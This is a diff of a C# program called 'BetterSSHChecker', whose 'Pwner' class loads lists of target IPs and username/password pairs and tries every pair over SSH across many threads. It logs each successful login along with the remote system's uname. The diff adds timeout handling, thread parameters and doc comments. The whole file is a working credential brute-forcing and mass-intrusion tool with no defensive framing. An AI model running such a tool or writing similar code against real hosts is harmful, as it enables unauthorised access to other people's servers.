@@ -46,10 +46,8 @@ namespace BetterSSHChecker
                 }
             }
 
-            Pwner Lord = new Pwner("dumbtest.txt", userpass_source);
-            Lord.check(3000, threads);
-
-
+            Pwner Lord = new Pwner("dumb.txt", userpass_source, 1000, 10);
+            
             Console.WriteLine("Done");
             Console.ReadKey();
 
@@ -58,23 +56,35 @@ namespace BetterSSHChecker
 
     }
 
-
+    /// <summary>
+    /// Pwner Class
+    /// </summary>
     class Pwner
     {
 
         private HashSet<string> IPS = new HashSet<string>();
         private HashSet<Credentials> credentials = new HashSet<Credentials>();
 
-        bool isUp = false;
-        int runningThread = 0;
-        int total_attemps = 0;
-        int testedAttemps = 0;
+        int timeout;
+        int threads;
 
+        bool isUp = false;
+        int runningThread   = 0;
+        int total_attemps   = 0;
+        int testedAttemps   = 0;
+
+        int maxTimeoutCount = 5;
+
+        /// <summary>
+        /// Contening an string username and string password.
+        /// </summary>
         struct Credentials
         {
             public string username;
             public string password;
 
+            /// <param name="username">The <see cref="string"/> instance that represents the username</param>
+            /// <param name="password">The <see cref="string"/> instance that represents the password.</param>
             public Credentials(string username, string password)
             {
                 this.username = username;
@@ -82,22 +92,41 @@ namespace BetterSSHChecker
             }
         }
 
+        /// <summary>
+        /// Contening an Exception Exception and string Uname.
+        /// </summary>
         public class SshResponse
         {
             public Exception Exception;
             public string uname;
-        }
-       
-        public Pwner(string target_file, string credentials_file)
-        {
 
+        }
+
+        /// <summary>
+        /// Pwner Constructor, import given files, and execute the prelude.
+        /// </summary>
+        /// <param name="target_file">The <see cref="string"/> instance that represents the location of the IP file.</param>
+        /// <param name="credentials_file">The <see cref="string"/> instance that represents the location of the credentials file.</param>
+        /// <param name="timeout">The <see cref="int"/> instance that represents the time in milliseconds before cancellation.</param>
+        /// <param name="threads">The <see cref="int"/> instance that represents the numbers of threads.</param>
+        public Pwner(string target_file, string credentials_file, int timeout, int threads)
+        {
+            this.timeout = timeout;
+            this.threads = threads;
             import(target_file, credentials_file);
             Prelude();
 
         }
 
+
+        /// <summary>
+        /// Import given IP and credentials file to feed the class's lists.
+        /// </summary>
+        /// <param name="target_file">The <see cref="string"/> instance that represents the location of the IP file.</param>
+        /// <param name="credentials_file">The <see cref="string"/> instance that represents the location of the credentials file.</param>
         public void import(string target_file, string credentials_file)
         {
+
             Stopwatch w = new Stopwatch();
             logIt("Importing...");
 
@@ -106,22 +135,29 @@ namespace BetterSSHChecker
                 getData<Credentials>(credentials_file, credentials);
             w.Stop();
 
+            total_attemps = IPS.Count * credentials.Count;
+
             logIt($"Importated {IPS.Count + credentials.Count} lines in: {w.ElapsedMilliseconds}ms");
 
         }
 
+
+        /// <summary>
+        /// Shows begining message.
+        /// </summary>
         public void Prelude()
         {
-            total_attemps = IPS.Count * credentials.Count;
             logIt($"Looking for {IPS.Count}*{credentials.Count}:{total_attemps} attempts.");
         }
-        
+
+        /// <summary>
+        /// Split toExplode into explodeNumber of HashSet.
+        /// </summary>
+        /// <param name="toExplode">The <see cref="HashSet"/> instance that initial HashSet to split.</param>
+        /// <param name="explodeNumber">The <see cref="int"/> instance that represents the number of HashSet in the return list.</param>
+        /// <returns>An instance of the <see cref="List"/> class contening explodedNumber of toExplode's splitted string.</returns>
         public List<HashSet<string>> splitHashSet(HashSet<string> toExplode, int explodeNumber)
         {
-
-            /*
-             * splitHashSet returns a List of HashSet containing explodedNumber of toExplode partitions.
-             */
 
             List<HashSet<string>> explodedResult = new List<HashSet<string>>();
             
@@ -152,24 +188,23 @@ namespace BetterSSHChecker
                 explodedResult[explodedResult.Count-1].UnionWith(tmp);
             }
 
+            tmp = null;
+
             return explodedResult;
 
         }
 
-        public void check(int timeout, int threads)
+        /// <summary>
+        /// Start checking every IP from <see cref="IPS"/> divided in n/<see cref="threads"/> worker threads for every credentials.
+        /// </summary>
+        public void startCheck()
         {
-            
+
             Stopwatch w = new Stopwatch();
 
             List<HashSet<string>> ThreadsWorkingSets = splitHashSet(IPS, threads);
             
             logIt($"{IPS.Count * credentials.Count} attemps / {threads}: {total_attemps / threads} per threads");
-
-
-            /*
-             * Method 1: n/threads
-             * 500 IPS, 100ms   =   180482ms
-             */
 
             w.Start();
 
@@ -184,16 +219,24 @@ namespace BetterSSHChecker
                         {
                             System.Threading.Thread.Sleep(100);
                         }
+
                         int currentThread = (int)Task.CurrentId;
 
                         bool exitLoop;
+                        bool tooManyTimeout;
+                        int  timeoutCount;
+
                         foreach (string IP in currentSet)
                         {
-                            exitLoop = false;
+
+                            timeoutCount = 0;
+                            tooManyTimeout = false;
+                            exitLoop     = false;
+
                             foreach (Credentials cred in credentials)
                             {
                                 
-                                SshResponse Response = meet(IP, cred.username, cred.password, 3000);
+                                SshResponse Response = meet(IP, cred.username, cred.password);
                                 Interlocked.Increment(ref testedAttemps);
 
                                 if (!(Response.Exception is null))
@@ -204,7 +247,10 @@ namespace BetterSSHChecker
                                         
                                         // Login timed out      -> continue
                                         case "Renci.SshNet.Common.SshOperationTimeoutException":
-                                            logIt($"{IP} timed out!", currentThread, false);
+                                            timeoutCount++;
+                                            if (timeoutCount == maxTimeoutCount) tooManyTimeout = true;
+
+                                            logIt($"{IP} timed out! {timeoutCount}/{maxTimeoutCount}", currentThread, false);
                                             break;
                                     
                                         // Network error, is off -> break to next IP
@@ -213,7 +259,7 @@ namespace BetterSSHChecker
                                             exitLoop = true;
                                             break;
 
-                                        // Network error         -> break to next IP
+                                        // Network error or connection refused -> break to next IP
                                         case "System.Net.Sockets.SocketException":
                                             logIt($"{IP} gone oopsy! \n::{Response.Exception.Message}", currentThread, false);
                                             exitLoop = true;
@@ -226,7 +272,7 @@ namespace BetterSSHChecker
 
                                     }
 
-                                    if (exitLoop) break;
+                                    if (exitLoop || tooManyTimeout) break;
                                   
                                 } else {
                                     logIt($"{IP}@{cred.username}:{cred.password} \n-> {Response.uname}", currentThread, true);
@@ -237,7 +283,6 @@ namespace BetterSSHChecker
                             }
 
                         }
-                            
                         
                        Interlocked.Decrement(ref runningThread);
                 });
@@ -275,9 +320,14 @@ namespace BetterSSHChecker
 
         }
 
+
+        /// <summary>
+        /// Import source file into a HashSet of <typeparamref name="T"/> destination. 
+        /// </summary>
+        /// <param name="source">The <see cref="string"/> instance that represents the location of the source file.</param>
+        /// <param name="destination">The <see cref="HashSet"/> instance that represents the destination of the imported source.</param>
         public void getData<T>(string source, HashSet<T> destination)
         {
-  
 
             using (StreamReader sr = File.OpenText(source))
             {
@@ -306,7 +356,15 @@ namespace BetterSSHChecker
 
         }
 
-        SshResponse meet(string targetIP, string user, string pass, int timeout)
+
+        /// <summary>
+        /// Connect to an SSH.
+        /// </summary>
+        /// <param name="targetIP">The <see cref="string"/> instance that represents the target IP.</param>
+        /// <param name="user">The <see cref="string"/> instance that represents the login.</param>
+        /// <param name="pass">The <see cref="string"/> instance that represents the password.</param>
+        /// <returns>An instance of the <see cref="SshResponse"/> class representing the result of the connection, an <see cref="Exception"/> if error; otherwise, an uname.</returns>
+        SshResponse meet(string targetIP, string user, string pass)
         {
 
             SshResponse response = new SshResponse();
@@ -340,16 +398,32 @@ namespace BetterSSHChecker
             
         }
 
+        /// <summary>
+        /// Write a message to the console with "[Current Time] message" syntax.
+        /// </summary>
+        /// <param name="message">The <see cref="string"/> instance that represents the message to display</param>
         public void logIt(string message)
         {
             Console.WriteLine("[{0}] {1}", DateTime.Now.ToString("hh:mm:ss"), message);
         }
 
+        /// <summary>
+        /// Write a message to the console with "[Current Time] #Wich Thread (+/-) message" syntax.
+        /// </summary>
+        /// <param name="message">The <see cref="string"/> instance that represents the message to display/param>
+        /// <param name="thread">The <see cref="int"/> instance that represents the caller's thread number./param>
+        /// <param name="success">The <see cref="bool"/> instance that represents if success or not (+/-).</param>
         public void logIt(string message, int thread, bool success)
         {
             Console.WriteLine("[{0}]#T{1}({2}) {3}", DateTime.Now.ToString("hh:mm:ss"), thread, success ? "+" : "-", message);
         }
-
+       
+        /// <summary>
+        /// Change console title to "{tested attemps/total} attemps r{number of attemps per second) r{number of attemps per minute}
+        /// </summary>
+        /// <param name="message">The <see cref="string"/> instance that represents the message to display/param>
+        /// <param name="thread">The <see cref="int"/> instance that represents the caller's thread number./param>
+        /// <param name="success">The <see cref="bool"/> instance that represents if success or not (+/-).</param>
         public void monitorMaster()
         {
             // Monitor rates
